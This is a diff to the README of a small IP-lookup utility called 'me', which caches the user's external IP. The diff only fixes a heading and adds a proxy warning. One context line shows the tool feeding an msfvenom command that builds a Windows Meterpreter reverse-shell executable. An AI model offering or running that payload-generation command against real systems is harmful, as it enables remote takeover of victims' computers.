@@ -13,7 +13,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=`me` LPORT=4444 >mp.exe
 ```
 Your will never need to query your external ip and paste it again.
 
-## how it work
+## How it work
 For the first time, `me` will request some apis to get your external ip and save the ip to `$USER/.myexternalip`.
 ```
 http://myexternalip.com/raw
@@ -23,3 +23,6 @@ https://api.ipify.org/
 ```
 Next time, `me` will get the ip from file.
 You can use `-f` option to make `me` query again, and use `-d` option to see debug information when occur errors.
+
+## Warning
+Don't use it when you are using a proxy.
